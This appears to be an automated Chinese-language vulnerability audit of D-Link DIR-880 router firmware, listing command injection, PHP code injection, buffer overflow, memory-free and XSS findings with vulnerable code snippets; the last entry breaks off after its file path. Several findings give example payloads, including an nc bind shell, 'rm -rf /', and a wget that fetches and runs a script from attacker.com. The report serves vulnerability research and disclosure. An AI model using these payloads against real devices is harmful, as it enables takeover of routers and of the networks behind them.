# _DIR-880 (37 个发现)

---

### CodeInjection-form_portforwarding

- **文件/目录路径：** `htdocs/mydlink/form_portforwarding`
- **位置：** `form_portforwarding:~18-40`
- **风险评分：** 9.0
- **置信度：** 9.0
- **描述：** 在 form_portforwarding.php 中，当处理端口转发配置时（settingsChanged POST 参数为 1），脚本将用户提供的 POST 数据直接写入临时 PHP 文件 (/tmp/form_portforwarding.php) 并使用 dophp 函数执行该文件。由于输入未经验证或过滤，攻击者可在 POST 参数中注入恶意 PHP 代码，导致服务器端任意命令执行。触发条件为提交包含 settingsChanged=1 的 POST 请求。潜在利用方式包括在诸如 'name_*' 或 'ip_*' 等字段中插入 PHP 代码（如 `'; system('id'); //`），从而执行系统命令、读取文件或提升权限。
- **代码片段：**
  ```
  $tmp_file = "/tmp/form_portforwarding.php";
  ...
  fwrite("a", $tmp_file, "$enable = $_POST["enabled_".$i."];\n");
  fwrite("a", $tmp_file, "$name = $_POST["name_".$i."];\n");
  // 类似行用于其他 POST 参数
  dophp("load",$tmp_file);
  ```
- **关键词：** $_POST[settingsChanged], $_POST[enabled_*], $_POST[name_*], $_POST[public_port_*], $_POST[public_port_to_*], $_POST[sched_name_*], $_POST[ip_*], $_POST[private_port_*], $_POST[hidden_private_port_to_*], $_POST[protocol_*], /tmp/form_portforwarding.php, dophp
- **备注：** 攻击者需要有效登录凭据但非 root 用户。临时文件路径固定，但执行后未立即删除，可能遗留痕迹。建议验证和过滤所有 POST 输入，避免将用户数据直接写入可执行文件。关联函数包括 fwrite 和 dophp。后续可分析 dophp 函数的实现以确认执行上下文。

---
### Command-Injection-PPP-TTY-Config

- **文件/目录路径：** `etc/services/INET/inet_ppp4.php`
- **位置：** `inet_ppp4.php:~150 (在 if ($over=="tty") 块中)`
- **风险评分：** 9.0
- **置信度：** 9.0
- **描述：** 在TTY模式下的PPP配置中，APN（接入点名称）和拨号号码用户输入未正确转义，直接用于构建shell命令，导致命令注入漏洞。攻击者可以通过Web界面或其他接口修改这些设置，插入恶意shell命令（如使用分号或管道符号），当PPP连接启动时，这些命令将以root权限执行。触发条件包括：设备使用USB调制解调器（TTY模式）、攻击者拥有有效登录凭据并能修改PPP配置、以及PPP连接被启动（例如通过服务重启或事件触发）。利用方式包括在APN或拨号号码字段插入命令（如'; nc -l -p 4444 -e /bin/sh;'）来获得反向shell或执行任意系统命令。代码中缺少输入验证和转义，允许攻击者控制命令执行。
- **代码片段：**
  ```
  fwrite(a, $START,
      'xmldbc -s '.$ttyp.'/apn "'.$apn.'"\n'.
      'xmldbc -s '.$ttyp.'/dialno "'.$dialno.'"\n'.
      'usb3gkit -o /etc/ppp/chat.'.$inf.' -v 0x'.$vid.' -p 0x'.$pid.' -d '.$devnum.'\n'.
      );
  ```
- **关键词：** /runtime/auto_config/apn, /runtime/auto_config/dialno, /inet/entry/ppp4/tty/apn, /inet/entry/ppp4/tty/dialno
- **备注：** 此漏洞需要攻击者能访问配置接口（如Web界面）并修改APN或拨号号码设置。建议验证Web界面是否对这些输入进行了过滤，以及设备是否在TTY模式下运行。后续分析应检查其他输入点（如PPPoE的AC名称和服务名称）是否也存在类似问题。

---
### Command-Injection-xmldbc-timer

- **文件/目录路径：** `usr/sbin/xmldb`
- **位置：** `xmldb:0x0000b45c fcn.0000b45c`
- **风险评分：** 9.0
- **置信度：** 9.0
- **描述：** A command injection vulnerability exists in the 'xmldb' daemon through the 'xmldbc' client's timer functionality (-t option). The function that processes the timer command (tag:sec:command) uses system() to execute the command without proper input validation or sanitization. An attacker with valid login credentials (non-root user) can exploit this by crafting a malicious command string that includes shell metacharacters, leading to arbitrary command execution with the privileges of the xmldb daemon (typically root or elevated privileges). The vulnerability is triggered when the timer expires and the command is executed via system().
- **代码片段：**
  ```
  // Disassembly snippet from function 0x0000b45c showing system call
  // The function parses the timer command and passes it to system()
  // Example: xmldbc -t "tag:60:ls" would execute 'ls' after 60 seconds
  // But if command is "tag:60; rm -rf /", it would execute the injection
  system(command_string); // Command string is user-controlled from -t option
  ```
- **关键词：** /var/run/xmldb_sock, xmldbc, -t, system
- **备注：** This vulnerability requires the attacker to have access to run xmldbc commands, which is feasible with valid user credentials. The attack chain is complete: user input -> command parsing -> system() execution. Further analysis could verify if other options (e.g., -x) have similar issues. The daemon typically runs as root, so command execution gains root privileges.

---
### CommandInjection-_startklips-klipsinterface

- **文件/目录路径：** `usr/lib/ipsec/_startklips`
- **位置：** `_startklips 脚本中的 klipsinterface 函数和 getinterfaceinfo 函数`
- **风险评分：** 9.0
- **置信度：** 9.0
- **描述：** 在 '_startklips' 脚本中发现命令注入漏洞。攻击者可通过控制命令行参数中的接口指定（如 'ipsec0=eth0; malicious_command'）注入任意命令。触发条件：脚本以 root 权限运行时（例如在系统启动过程中），攻击者作为非 root 用户能影响脚本调用参数。漏洞位于 `klipsinterface` 函数中，其中 `phys` 变量从用户输入提取并直接传递给 `getinterfaceinfo` 函数，该函数使用 `ip addr show dev $phys` 命令。由于缺少输入验证和转义，如果 `phys` 包含 shell 元字符（如分号），可执行恶意命令。利用方式：攻击者调用脚本并传递恶意接口参数，如 `_startklips --log daemon.error 'ipsec0=eth0; whoami'`，导致 `whoami` 命令以 root 权限执行。此漏洞允许完整攻击链从用户输入到危险操作（任意命令执行）。
- **代码片段：**
  ```
  klipsinterface() {
  	# pull apart the interface spec
  	virt=\`expr $1 : '\([^=]*\)=.*'\`
  	phys=\`expr $1 : '[^=]*=\(.*\)'\`
  
  	# ...
  
  	# figure out config for interface
  	phys_addr=
  	eval \`getinterfaceinfo $phys phys_\`
  	if test " $phys_addr" = " "
  	then
  		echo "unable to determine address of \\`$phys'"
  		exit 1
  	fi
  	# ...
  }
  
  getinterfaceinfo() {
  	ip addr show dev $1 | awk '
  	BEGIN {
  		MTU=""
  		TYPE="unknown"
  	}
  	/BROADCAST/   { TYPE="broadcast" }
  	/POINTOPOINT/ { TYPE="pointtopoint" }
  	/mtu/ {
  			sub("^.*mtu ", "", $0)
  			MTU=$1
  		}
  	$1 == "inet" || $1 == "inet6" {
  			split($2,addr,"/")
  			other=""
  			if ($3 == "peer")
  				other=$4
  			print "'$2'type=" TYPE
  			print "'$2'addr=" addr[1]
  			print "'$2'mask=" addr[2]
  			print "'$2'otheraddr=" other
  			print "'$2'mtu=" MTU
  			exit 0
  		}'
  }
  ```
- **关键词：** 命令行参数（接口指定，如 ipsec0=eth0）, 环境变量 IPSEC_INIT_SCRIPT_DEBUG, 环境变量 IPSECprotostack, 文件路径 /proc/sys/net/ipsec, 文件路径 /var/run/pluto/ipsec.info
- **备注：** 此漏洞需要脚本以 root 权限运行，这在系统启动或 IPsec 配置时可能发生。攻击者需有权限调用脚本或影响其参数（例如通过其他服务）。建议添加输入验证和转义，例如使用引号或白名单验证接口名称。后续可分析其他脚本（如 '_startnetkey'）是否存在类似问题。

---
### 无标题的发现

- **文件/目录路径：** `etc/services/WIFI/rtcfg.php`
- **位置：** `rtcfg.php:dev_start 函数和 try_set_psk_passphrase 函数`
- **风险评分：** 9.0
- **置信度：** 8.5
- **描述：** 在 'rtcfg.php' 中发现命令注入漏洞，允许经过身份验证的非 root 用户通过操纵无线网络设置（如 SSID 或预共享密钥）执行任意 shell 命令。漏洞源于用户输入未经过滤直接嵌入到 'nvram set' 命令中，这些命令被输出为 shell 脚本并执行。攻击者可以注入恶意命令（例如，通过设置 SSID 为 '\"; malicious_command; #'）来破坏命令结构并执行任意代码。由于脚本可能由 web 服务器以 root 权限调用，成功利用可导致完全系统妥协。触发条件包括攻击者拥有有效登录凭据并能修改无线配置（例如通过 web 接口），随后触发脚本执行（如应用设置或设备重启）。
- **代码片段：**
  ```
  在 dev_start 函数中：echo "nvram set ".$wl_prefix."_ssid=\"" . get("s", $wifi."/ssid") . "\"\n";
  在 try_set_psk_passphrase 函数中：$key = query($wifi."/nwkey/psk/key"); echo "nvram set ".$wl_prefix."_wpa_psk=\"" . $key . "\"\n";
  ```
- **关键词：** wlx_ssid, wlx_wpa_psk, wifi/ssid, wifi/nwkey/psk/key, ACTION, PHY_UID
- **备注：** 漏洞的完整利用链依赖于 web 接口或其他组件调用此脚本并传递用户可控参数。建议进一步验证 'get' 和 'query' 函数的输入过滤机制（位于包含文件中如 'xnode.php'），并检查脚本执行上下文（是否以 root 运行）。其他潜在注入点包括 WEP 密钥设置，但 WEP 已不常用。关联文件：/htdocs/phplib/xnode.php（可能包含输入处理逻辑）。

---
### PHP-Injection-form_macfilter

- **文件/目录路径：** `htdocs/mydlink/form_macfilter`
- **位置：** `form_macfilter (具体行号未知，但代码位于循环中 fwrite 和 dophp 调用处)`
- **风险评分：** 9.0
- **置信度：** 8.0
- **描述：** 在 'form_macfilter' 脚本中，存在 PHP 代码注入漏洞，允许攻击者通过恶意 POST 参数执行任意代码。具体表现：当 settingsChanged=1 且 last 为空时，脚本在循环中将 $_POST 值（如 entry_enable_i、mac_i、mac_hostname_i、mac_addr_i、sched_name_i）直接写入临时文件 /tmp/form_macfilter.php，然后使用 dophp('load', $tmp_file) 加载执行。由于缺少输入验证和过滤，攻击者可在这些参数中注入 PHP 代码（例如 '1; system("id"); //'），导致代码执行。触发条件：攻击者发送 POST 请求到该脚本，设置 settingsChanged=1，并确保 last 为空（通过不设置或清空 entry_enable_$max），然后在任意 entry_* 参数中注入代码。潜在攻击包括执行系统命令、下载恶意软件或提升权限。利用方式简单，只需一次 HTTP 请求。
- **代码片段：**
  ```
  fwrite("a", $tmp_file, "$enable = $_POST[\"entry_enable_".$i."\"];\n");
  fwrite("a", $tmp_file, "$mac = $_POST[\"mac_".$i."\"];\n");
  fwrite("a", $tmp_file, "$mac_hostname = $_POST[\"mac_hostname_".$i."\"];\n");
  fwrite("a", $tmp_file, "$mac_addr = $_POST[\"mac_addr_".$i."\"];\n");
  fwrite("a", $tmp_file, "$sched_name = $_POST[\"sched_name_".$i."\"];\n");
  dophp("load",$tmp_file);
  ```
- **关键词：** $_POST['settingsChanged'], $_POST['macFltMode'], $_POST['entry_enable_*'], $_POST['mac_*'], $_POST['mac_hostname_*'], $_POST['mac_addr_*'], $_POST['sched_name_*'], /tmp/form_macfilter.php, dophp
- **备注：** 漏洞基于代码分析证据，但未进行实际运行时验证。dophp 函数可能来自包含文件（如 /htdocs/mydlink/libservice.php），建议进一步分析这些文件以确认其行为。攻击链完整，从输入到代码执行，但实际利用可能受 web 服务器权限影响（如果以 root 运行，风险更高）。关联函数：get_valid_mac 可能过滤 mac 字段，但其他字段无过滤。后续方向：验证 dophp 函数定义，检查是否有其他类似漏洞在相关脚本中。

---
### 无标题的发现

- **文件/目录路径：** `etc/services/INET/inet_ppp4_combo.php`
- **位置：** `inet_ppp4_combo.php 在 lower_dhcp 函数中（具体代码位置约在文件中部，udhcpc 命令拼接处）`
- **风险评分：** 9.0
- **置信度：** 8.0
- **描述：** 在 lower_dhcp 函数中，主机名从 '/device/hostname' 获取并直接拼接到 udhcpc 命令中，没有进行适当的转义或验证。攻击者（拥有有效登录凭据的非root用户）可以通过Web界面或API设置恶意主机名（如包含分号或反引号的字符串），当PPP连接使用DHCP模式时，lower_dhcp 函数被调用，生成并执行 udhcpc 命令，导致命令注入。漏洞触发条件：PPP连接配置为DHCP模式，且主机名被修改为恶意值。利用方式：注入任意命令获取root权限，完全控制设备。
- **代码片段：**
  ```
  DIALUP('udhcpc '.$unicast.'-i '.$ifname.' -H '.$hostname.' -p '.$udhcpc_pid.' -s '.$udhcpc_helper.' &');
  ```
- **关键词：** /device/hostname, lower_dhcp, inet_ppp4_combo.php, udhcpc
- **备注：** 证据基于代码分析，显示直接字符串拼接且无过滤。建议进一步验证主机名是否通过Web界面或API用户可控，并检查包含文件（如 /htdocs/phplib/trace.php）中是否有输入过滤机制。关联文件：/etc/services/INET/options_ppp4.php 可能包含相关配置。

---
### Command-Injection-DS_IPT-wfa_igd_handle

- **文件/目录路径：** `etc/scripts/wfa_igd_handle.php`
- **位置：** `wfa_igd_handle.php 在 DS_IPT 模式处理块（约行 150-180）`
- **风险评分：** 8.5
- **置信度：** 9.0
- **描述：** 在 wfa_igd_handle.php 文件的 DS_IPT 模式处理中，存在命令注入漏洞。攻击者可以通过控制 $C_IP 或 $E_PORT 变量注入恶意命令。触发条件：攻击者发送 MODE=DS_IPT 的请求，并提供恶意的 $C_IP 或 $E_PORT 值（例如包含分号或反引号的字符串）。漏洞利用方式：由于变量直接拼接进 iptables 命令字符串并通过 exe_ouside_cmd 执行，注入的命令将以 Web 服务器进程权限运行（可能为 root）。缺少输入验证和边界检查，允许任意命令执行。
- **代码片段：**
  ```
  else if($MODE=="DS_IPT")  //add directserver iptable rules
  {
      $ipt_cmd="";
      
      if($C_IP=="0.0.0.0")
          {$ipt_cmd="PRE.WFA -p tcp";}
      else
          {$ipt_cmd="PRE.WFA -p tcp -s ".$C_IP;}
          
      if($SSL == '0')
          {$ipt_cmd=$ipt_cmd." --dport ".$E_PORT." -j REDIRECT --to-ports ".query("/webaccess/httpport");}
      else
          {$ipt_cmd=$ipt_cmd." --dport ".$E_PORT." -j REDIRECT --to-ports ".query("/webaccess/httpsport");}
      
      if($ipt_cmd!="")
      {
          $del_ipt="iptables -t nat -D ".$ipt_cmd;
          exe_ouside_cmd($del_ipt);
          $add_ipt="iptables -t nat -A ".$ipt_cmd;
          exe_ouside_cmd($add_ipt);
      }
      // ... 更多代码
  }
  ```
- **关键词：** $C_IP, $E_PORT, $MODE, /runtime/webaccess/
- **备注：** 漏洞利用链完整：不可信输入（$C_IP/$E_PORT）→ 命令构建 → 执行。建议验证 Web 服务器运行权限和输入点可访问性。其他模式（如 SEND_IGD）也可能存在类似问题，但 DS_IPT 模式证据最明确。

---
### Command-Injection-dhcps6-commands

- **文件/目录路径：** `etc/services/DHCPS/dhcps6.php`
- **位置：** `dhcps6.php:commands 函数（具体行号未在输出中显示，但代码片段中多次出现，例如在生成 radvd 和 dhcp6s 命令处）`
- **风险评分：** 8.5
- **置信度：** 9.0
- **描述：** 在 'dhcps6.php' 的 `commands` 函数中，用户可控的 `$inf` 参数（接口UID）被直接插入到 shell 命令字符串中，缺乏适当的输入验证或转义，导致命令注入漏洞。攻击者可通过恶意构造的 `$name` 参数（传入 `dhcps6setup` 函数）注入任意命令。触发条件：当脚本处理DHCPv6配置时，调用 `dhcps6setup` 函数并执行相关命令。利用方式：攻击者设置 `$name` 包含 shell 元字符（如分号、反引号），例如 'attacker; echo hacked'，从而在命令执行时注入并执行恶意代码。该漏洞允许非root用户提升权限或执行系统命令。
- **代码片段：**
  ```
  示例代码片段：
  - \`startcmd('radvd -C '.$racfg.' -p '.$rapid);\` // $racfg 包含 $inf
  - \`startcmd('dhcp6s -c '.$dhcpcfg.' -P '.$dhcppid.' -s '.$hlp.' -u '.$inf.' '.$ifname);\` // $inf 直接用于命令
  其中 $inf 来自 $name 参数，未经验证即用于字符串拼接。
  ```
- **关键词：** $name 参数（用户输入）, /var/run/radvd.*.conf, /var/run/dhcps6.*.conf, radvd 命令, dhcp6s 命令
- **备注：** 该漏洞需要攻击者已通过认证并能调用相关函数（例如通过Web管理界面）。建议检查输入来源并实施严格的输入验证和转义。后续可分析其他调用该脚本的组件以确认攻击向量。

---
### Command-Injection-upnp-NOTIFY-WFADEV-host

- **文件/目录路径：** `etc/scripts/upnp/run.NOTIFY-WFADEV.php`
- **位置：** `run.NOTIFY-WFADEV.php: 在 foreach ($SERVICE."/subscription") 循环中（具体行号不可用，但从代码结构位于循环体内）`
- **风险评分：** 8.5
- **置信度：** 9.0
- **描述：** 命令注入漏洞存在于 $host 变量的使用中。当处理 UPnP 事件通知时，脚本通过 `query("host")` 获取 $host 值（来自 UPnP 订阅请求），并直接嵌入到 `httpc` 命令的 `-d` 参数中。由于 $host 被包裹在双引号中但未转义，攻击者可在 $host 中注入特殊字符（如 `"; malicious_command; "`）来突破双引号限制并执行任意命令。触发条件：攻击者通过 UPnP 订阅设置恶意的 'host' 值；当设备处理通知时，脚本执行并触发命令注入。约束条件：攻击者需拥有有效登录凭据并连接到设备网络。潜在攻击方式：注入命令如 `"; wget http://attacker.com/malware.sh -O /tmp/malware.sh; sh /tmp/malware.sh; "` 到 $host，导致远程代码执行。相关代码逻辑：数据流从 UPnP 请求到 `query("host")`，最终在 `httpc` 命令中执行。
- **代码片段：**
  ```
  从 'run.NOTIFY-WFADEV.php' 相关代码：
  foreach ($SERVICE."/subscription")
  {
  	$host = query("host");
  	// ... 其他代码 ...
  	echo "cat ".$temp_file." | httpc -i ".$phyinf." -d \"".$host."\" -p TCP > /dev/null\n";
  }
  ```
- **关键词：** $host, UPnP subscription host field, /runtime/services/upnp/inf, httpc command, /var/run/WFAWLANConfig-*-payload
- **备注：** 漏洞可被已登录的非 root 用户利用，因为 UPnP 订阅可能通过网络接口访问。类似漏洞在 'run.NOTIFY-PROPCHANGE.php' 中被 ParallelTaskDelegator 子任务确认，增强了可信度。建议检查包含文件（如 gena.php）以验证变量来源，但当前证据已足够确认漏洞。后续可分析 httpc 二进制以评估影响范围。

---
### BufferOverflow-nvram_set

- **文件/目录路径：** `usr/sbin/nvram`
- **位置：** `nvram:0x00008754 (function fcn.00008754, strncpy call site)`
- **风险评分：** 8.5
- **置信度：** 8.0
- **描述：** 在 'nvram' 二进制文件的 'set' 操作中发现栈缓冲区溢出漏洞。当用户执行 'nvram set name=value' 命令时，参数 'value' 被处理使用 strncpy 复制到栈缓冲区。strncpy 使用固定大小 0x10000（65536 字节），但目标缓冲区的可用空间仅约 65496 字节，导致溢出 40 字节。溢出覆盖栈上的保存寄存器（如 R11、LR）和返回地址。触发条件：参数 'value' 长度 >= 65496 字节。潜在攻击：攻击者可构造恶意参数值覆盖返回地址，劫持控制流并执行任意代码。利用方式：作为已登录用户，运行 'nvram set name=<long_string>' 其中 <long_string> 长度 >= 65496 字节并包含 shellcode 或 ROP 链。代码逻辑在函数 fcn.00008754 的 'set' 分支中，涉及 strncpy 和后续 strsep 调用。
- **代码片段：**
  ```
  // From decompiled function fcn.00008754
  pcVar10 = ppcVar3[1]; // User-provided value parameter
  ppcVar4 = ppcVar3 + 1;
  if (pcVar10 == NULL) goto code_r0x000087cc;
  iVar1 = iVar14 + -0x10000 + -4; // Calculate buffer address
  *(iVar14 + -4) = iVar1;
  sym.imp.strncpy(iVar1, pcVar10, 0x10000); // Buffer overflow here
  uVar2 = sym.imp.strsep(iVar14 + -4, iVar5 + *0x89b0); // May read out-of-bounds due to missing null terminator
  sym.imp.nvram_set(uVar2, *(iVar14 + -4));
  ```
- **关键词：** nvram_set, strncpy, strsep
- **备注：** 漏洞已通过反编译验证，但建议进一步动态测试以确认可利用性（如调试崩溃点）。关联函数：fcn.00008754（主逻辑）、nvram_set（NVRAM 交互）。攻击链完整：从命令行输入到栈溢出。后续分析可检查其他操作（如 'get'）是否有类似问题，或分析 NVRAM 库本身。

---
### Command-Injection-fcn.0000be2c

- **文件/目录路径：** `usr/bin/minidlna`
- **位置：** `minidlna:0xc524 (fcn.0000be2c)`
- **风险评分：** 8.0
- **置信度：** 9.0
- **描述：** In function fcn.0000be2c, which handles command-line argument parsing for minidlna, a command injection vulnerability exists when processing the '-R' option. User-provided input from argv is directly used in a snprintf call as the format string without sanitization or bounds checking. The resulting buffer is then passed to the system function, allowing arbitrary command execution. Trigger condition: minidlna is started with the '-R' option, and the attacker controls the argument to this option. Exploitation: an attacker can inject shell commands by providing a malicious string as the argument, e.g., 'minidlna -R "malicious_command; whoami"'. Constraints: the attacker must have influence over the command-line arguments used to start minidlna, which could be achieved through configuration files, service scripts, or direct execution if the attacker has shell access. The vulnerability is exploitable by a non-root user with valid login credentials if they can modify startup parameters or execute minidlna with controlled arguments.
- **代码片段：**
  ```
  case 6:
      ppiVar21 = *0xce7c;
      *(puVar26 + -0x11e4) = *(puVar26 + -0x11c0);
      sym.imp.snprintf(*(puVar26 + -0x11b0), 0x1000);  // User input used as format string
      iVar14 = sym.imp.system(*(puVar26 + -0x11b0));  // Buffer passed to system
      if (iVar14 != 0) {
          ppiVar21 = *0xcf4c;
          *(puVar26 + -0x11e4) = 0x2d8c | 0x30000;
          fcn.000314d8(3, 0, ppiVar21, 0x30c);
      }
      break;
  ```
- **关键词：** argv, *(puVar26 + -0x11c0), *(puVar26 + -0x11b0)
- **备注：** The vulnerability was verified through decompilation analysis, showing a clear data flow from argv to system. The snprintf call uses user input directly as the format string with no additional arguments, meaning the input is copied verbatim into the buffer. This constitutes a complete and exploitable command injection chain. Further validation could involve dynamic testing, but the static evidence is strong. Other functions with strcpy/sprintf usage were noted but lacked full input-to-exploit chains.

---
### 任意内存释放-ISAKMP-v2

- **文件/目录路径：** `usr/libexec/ipsec/pluto`
- **位置：** `pluto:0x0004bea4 sym.process_v2_packet -> pluto:0x0004d818 sym.complete_v2_state_transition -> pluto:0x0004ce50 sym.success_v2_state_transition -> pluto:0x0004d258 sym.leak_pfree`
- **风险评分：** 8.0
- **置信度：** 8.5
- **描述：** 在处理版本2 ISAKMP 数据包时，污点数据通过函数调用链传播到 sym.leak_pfree，导致任意内存释放。攻击者可以操纵版本2数据包中的特定字段（如状态指针），控制释放的内存地址，触发 use-after-free 或 double-free。触发条件：发送特制版本2 ISAKMP 数据包到 Pluto 守护进程。潜在利用方式包括内存损坏、代码执行或拒绝服务。利用步骤：1) 攻击者发送恶意版本2数据包；2) 数据包通过 sym.process_packet 进入处理；3) 污点数据传播到 sym.leak_pfree，释放任意地址内存。
- **代码片段：**
  ```
  在 sym.success_v2_state_transition 中（地址 0x0004d23c-0x0004d258）：
  0x0004d23c: ldr r3, [var_34h]   ; 加载污点指针（来自数据包）到 r3
  0x0004d240: ldr r2, [r3, 0x240] ; 解引用指针获取内存地址
  0x0004d250: mov r0, r2          ; 传递地址到 r0
  0x0004d258: bl sym.leak_pfree   ; 调用内存释放，地址可控，导致任意释放
  ```
- **关键词：** ISAKMP 数据包结构指针, sym.leak_pfree, UDP 端口 500/4500, sym.process_v2_packet, sym.complete_v2_state_transition, sym.success_v2_state_transition
- **备注：** 攻击链完整且可重现，污点数据从输入点直接传播到危险操作。攻击者作为认证用户可能通过 API 或套接字发送数据包。建议审计内存管理函数并实施输入验证。关联文件可能包括 state.c 或 vendorid.c（从代码引用推断）。

---
### 无标题的发现

- **文件/目录路径：** `sbin/httpd.c`
- **位置：** `httpd.c:A070 sub_A070`
- **风险评分：** 8.0
- **置信度：** 8.0
- **描述：** 在函数 `sub_A070`（认证处理）中，存在缓冲区溢出风险。使用 `strcpy` 复制用户名到固定大小的缓冲区，未检查长度。攻击者可以提供超长的用户名，导致栈溢出。触发条件：攻击者发送超长 Authorization 头。利用方式：覆盖返回地址，执行任意代码。
- **代码片段：**
  ```
  strcpy(dest, &s2);  // dest 大小未验证
  ```
- **关键词：** Authorization, strcpy
- **备注：** 需要确认缓冲区大小，但代码中缺少边界检查。建议替换为安全函数如 strncpy。

---
### command-injection-_updown.mast-functions

- **文件/目录路径：** `usr/lib/ipsec/_updown.mast`
- **位置：** `_updown.mast:addsource function (approx. line 400 in content), _updown.mast:changesource function (approx. line 430), _updown.mast:doipsecrule function (approx. line 500)`
- **风险评分：** 8.0
- **置信度：** 7.0
- **描述：** 在 '_updown.mast' 脚本的多个函数中，环境变量被直接插入 shell 命令字符串并通过 eval 执行，缺乏输入验证和转义，导致命令注入漏洞。具体表现：当 IPsec 事件（如连接建立或断开）触发脚本执行时，函数如 'addsource'、'changesource' 和 'doipsecrule' 使用环境变量（如 PLUTO_MY_SOURCEIP、PLUTO_INTERFACE、PLUTO_CONNECTION）构造命令字符串，然后通过 eval 执行。如果攻击者能控制这些环境变量并注入 shell 元字符（如分号、反引号），可执行任意命令。触发条件包括：IPsec 守护进程（Pluto）以 root 权限调用脚本，且环境变量被恶意设置（例如通过欺骗或恶意连接配置）。潜在攻击方式：注入命令如 '; rm -rf /' 或 '; /bin/sh' 以获得 root shell。约束条件：攻击者需能影响 IPsec 配置或环境变量，但作为已登录用户可能通过应用程序漏洞或配置错误实现。
- **代码片段：**
  ```
  addsource() {
      st=0
      if ! ip -o route get ${PLUTO_MY_SOURCEIP%/*} | grep -q ^local; then
          it="ip addr add ${PLUTO_MY_SOURCEIP%/*}/32 dev ${PLUTO_INTERFACE%:*}"
          oops="\`eval $it 2>&1\`"
          st=$?
          # ... error handling
      fi
      return $st
  }
  
  changesource() {
      st=0
      parms="$PLUTO_PEER_CLIENT"
      parms2="dev $PLUTO_INTERFACE"
      parms3="src ${PLUTO_MY_SOURCEIP%/*}"
      it="ip route $cmd $parms $parms2 $parms3"
      oops="\`eval $it 2>&1\`"
      # ... error handling
  }
  
  doipsecrule() {
      srcnet=$PLUTO_MY_CLIENT_NET/$PLUTO_MY_CLIENT_MASK
      dstnet=$PLUTO_PEER_CLIENT_NET/$PLUTO_PEER_CLIENT_MASK
      rulespec="--src $srcnet --dst $dstnet -m mark --mark 0/0x80000000 -j MARK --set-mark $nf_saref"
      if $use_comment ; then
          rulespec="$rulespec -m comment --comment '$PLUTO_CONNECTION'"
      fi
      it="iptables -t mangle -I NEW_IPSEC_CONN 1 $rulespec"
      oops="\`set +x; eval $it 2>&1\`"
      # ... error handling
  }
  ```
- **关键词：** PLUTO_MY_SOURCEIP, PLUTO_INTERFACE, PLUTO_PEER_CLIENT, PLUTO_MY_CLIENT_NET, PLUTO_MY_CLIENT_MASK, PLUTO_PEER_CLIENT_NET, PLUTO_PEER_CLIENT_MASK, PLUTO_CONNECTION, /etc/sysconfig/pluto_updown, /etc/default/pluto_updown
- **备注：** 证据来自脚本内容，显示直接使用环境变量在 eval 命令中。需要进一步验证：1) 脚本是否在真实环境中以 root 权限运行（通常由 Pluto 守护进程调用）；2) 环境变量是否可由攻击者控制（例如通过 IPsec 配置或网络欺骗）。建议后续分析 Pluto 守护进程的权限机制和配置文件的访问控制。其他相关函数如 'updateresolvconf' 也可能存在类似问题，但命令注入更直接可利用。

---
### Command-Injection-auto

- **文件/目录路径：** `usr/libexec/ipsec/auto`
- **位置：** `文件 'auto'，行 100-120（具体位置在 'echo "ipsec whack $async --name $names --initiate" | runit' 附近）`
- **风险评分：** 7.5
- **置信度：** 9.0
- **描述：** 在文件 'auto' 中发现命令注入漏洞。用户输入的 'names' 参数在多个操作（如 --up、--down、--add）中被直接拼接到 shell 命令字符串中，缺少验证和过滤。例如，命令 'echo "ipsec whack --name $names --initiate" | runit' 中，如果 'names' 包含 shell 元字符（如分号、&、|），则会在 'runit' 函数执行时被解析为命令分隔符，导致注入任意命令。触发条件：攻击者作为非 root 用户执行脚本并提供恶意 'names' 参数，且未使用 --showonly 选项。利用链完整：输入点明确，数据流直接，可执行任意命令。潜在攻击示例：执行 './auto --up "foo; id"' 注入 'id' 命令。
- **代码片段：**
  ```
  case "$op" in
  --up)  echo "ipsec whack $async --name $names --initiate"    | runit ; exit ;;
  --down)        echo "ipsec whack --name $names --terminate"          | runit ; exit ;;
  --delete)         echo "ipsec whack --name $names --delete"  | runit ; exit ;;
  # 类似其他操作
  runit() {
      if test "$showonly"
      then
          cat
      else
          (
              echo '('
              echo 'exec <&3'     # regain stdin
              cat
              echo ');'
          ) | ash $shopts |
              awk "/^= / { exit \$2 } $logfilter { print }"
      fi
  }
  ```
- **关键词：** names 变量, ipsec whack 命令, ipsec addconn 命令, /var/run/pluto/ipsec.info 文件路径
- **备注：** 漏洞允许非 root 用户执行任意命令，尽管权限受限，仍构成安全风险。需要验证脚本在实际环境中的权限和可访问性；如果以 setuid 或更高权限运行，风险可能升级。关联文件 '/var/run/pluto/ipsec.info' 可能包含配置，但非 root 用户可能无法控制。建议后续分析：检查 'ipsec whack' 和 'ipsec addconn' 二进制文件是否有其他漏洞，并验证脚本在真实环境中的行为。

---
### XSS-music.php-show_media_list

- **文件/目录路径：** `htdocs/web/webaccess/music.php`
- **位置：** `music.php:JavaScript function show_media_list (具体在 title 属性和文本内容插入处)`
- **风险评分：** 7.5
- **置信度：** 8.5
- **描述：** 在 'music.php' 的客户端 JavaScript 代码中，媒体文件名（obj.name）从服务器返回后直接插入到 HTML 的 title 属性和文本内容中，未进行转义。如果攻击者上传一个文件名包含恶意脚本的音乐文件（例如包含双引号或 HTML 标签），当用户访问音乐列表页面时，脚本可能被执行。触发条件：用户登录后访问 music.php 页面，查看包含恶意文件名的音乐列表。潜在利用方式：攻击者上传文件名为 '" onmouseover="alert(1)"' 或 '<script>alert(1)</script>' 的音乐文件，当用户鼠标悬停或查看列表时，执行任意 JavaScript 代码，可能导致会话窃取或进一步攻击。约束条件：攻击者需具有文件上传权限（非 root 用户），且服务器返回的数据未过滤。
- **代码片段：**
  ```
  var req="/dws/api/GetFile?id=" + storage_user.get("id")+"&volid="+obj.volid+"&path="+encodeURIComponent(obj.path)+"&filename="+encodeURIComponent(obj.name);
  str += "<tr onMouseOver=\"this.style.background='#D8D8D8'\" onMouseOut=\"this.style.background=''\">"
       + "<td width=\"36\" height=\"36\" class=\"tdbg\">"
       + "<img src=\"webfile_images/icon_music.png\" width=\"36\" height=\"36\" border=\"0\">"
       + "</td>"
       + "<td width=\"868\" class=\"text_2\">"
       + "<a rel=\"musicl\" href=\""+req+"\" title=\"" + obj.name + "\">"
       + "<div>"
       + file_name + "<br>" + get_file_size(obj.size) + ", " + obj.mtime
       + "</div>"
       + "</a>"
       + "</td></tr>"
  ```
- **关键词：** obj.name, media_info.files[i].name, /dws/api/GetFile
- **备注：** 此漏洞依赖于服务器返回未过滤的文件名数据。建议验证服务器端对文件名的过滤和转义。需要进一步分析文件上传机制和相关 API（如 /dws/api/GetFile）以确认攻击链的完整性。关联文件可能包括上传处理脚本和服务器端 API 端点。

---
### DNS-Injection-get_filter

- **文件/目录路径：** `etc/services/DNS/dnscfg.php`
